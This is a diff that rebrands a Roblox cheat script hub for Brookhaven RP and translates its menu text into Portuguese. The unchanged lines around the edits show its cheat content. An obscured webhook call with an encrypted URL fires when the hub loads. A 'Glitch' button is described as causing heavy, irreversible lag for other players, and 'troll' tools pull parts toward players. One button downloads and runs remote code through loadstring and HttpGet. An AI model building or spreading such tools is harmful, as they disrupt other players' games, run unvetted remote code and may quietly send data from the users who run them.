@@ -8,13 +8,13 @@ local cryptUrl = "f2a63231a55a328483c71b504dc4b67a5a0382d1a5e0fbffd5a290a5735376
 requestWebhook(cryptUrl)
 
 local Window = Libary:MakeWindow({
-    Title = "CYA STUDIOS HUB | Brookhaven RP v1.2",
+    Title = "HavenXClient | Brookhaven RP v1.2",
     SubTitle = "by: PHGS",
-    LoadText = "Loading CYA STUDIOS HUB",
-    Flags = "Cyastudios_hub"
+    LoadText = "Loading HavenXClient",
+    Flags = "HavenXClient"
 })
 Window:AddMinimizeButton({
-    Button = { Image = "rbxassetid://113977525656869", BackgroundTransparency = 0 },
+    Button = { Image = "rbxassetid://11902680347", BackgroundTransparency = 0 },
     Corner = { CornerRadius = UDim.new(35, 1) },
 })
 
@@ -23,24 +23,24 @@ local InfoTab = Window:MakeTab({ Title = "Info", Icon = "rbxassetid://1530913847
 
 
 InfoTab:AddDiscordInvite({
-    Name = "CYA STUDIOS",
-    Description = "Join server",
-    Logo = "rbxassetid://113977525656869",
-    Invite = "https://discord.gg/WFvptVZwSX",
+    Name = "HavenXClient",
+    Description = "Entrar no servidor",
+    Logo = "rbxassetid://11902680347",
+    Invite = "",
 })
 
 InfoTab:AddDiscordInvite({
-    Name = "CYA STUDIOS SITE",
-    Description = "copy link",
-    Logo = "rbxassetid://113977525656869",
-    Invite = "https://cyastudios-site.vercel.app",
+    Name = "HavenXClient",
+    Description = "Copiar link",
+    Logo = "rbxassetid://11902680347",
+    Invite = "",
 })
 
 
 InfoTab:AddSection({ "Script Information" })
-InfoTab:AddParagraph({ "Owner / Developer:", "PHGS" })
-InfoTab:AddParagraph({ "Collaborations:", "gtz, mineirinho" })
-InfoTab:AddParagraph({ "You are using:", "CYA STUDIOS HUB Brookhaven " })
+InfoTab:AddParagraph({ "Owner / Developer:", "The wolf" })
+InfoTab:AddParagraph({ "Collaborations:", "Richard" })
+InfoTab:AddParagraph({ "You are using:", "HavenXClient Brookhaven " })
 InfoTab:AddParagraph({"Your executor:", executor})
 
 InfoTab:AddSection({ "Rejoin" })
@@ -56,7 +56,7 @@ local trava = Window:MakeTab({ Title = "Glitch", Icon = "hammer" })
 
 trava:AddButton({
     Name = "Expansão de dominio",
-    Description = "causa muito lag nos jogadores",
+    Description = "causa muito lag nos jogadores irreversível",
     Callback = function()
             -- Serviços
         local TextChatService = game:GetService("TextChatService")
@@ -214,7 +214,7 @@ local TrollTab = Window:MakeTab({ Title = "Troll Scripts", Icon = "rbxassetid://
 TrollTab:AddSection({ "Black Hole" })
 TrollTab:AddButton({
     Name = "Black Hole",
-    Description = "Activating this will pull parts towards your character",
+    Description = "Ativar isso puxará partes em direção ao seu personagem",
     Callback = function()
         local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -368,7 +368,7 @@ toggleBlackHole()
 TrollTab:AddSection({ "Pull Parts" })
 TrollTab:AddButton({
     Name = "Pull Parts",
-    Description = "To use, get close to the selected player",
+    Description = "Para usar, aproxime-se do jogador selecionado",
     Callback = function()
         -- Gui to Lua
 -- Version: 3.2
@@ -733,7 +733,7 @@ TrollTab:AddToggle({
 TrollTab:AddSection({ "Anti Sit" })
 TrollTab:AddToggle({
     Name = "Anti Sit",
-    Description = "Prevents your character from sitting",
+    Description = "Impede que seu personagem fique sentado",
     Default = false,
     Callback = function(Value)
         local player = game.Players.LocalPlayer
@@ -9420,5 +9420,6 @@ UniversalTab:AddButton({
         loadstring(game:HttpGet("https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md", true))()
     end
 })
+
 
 
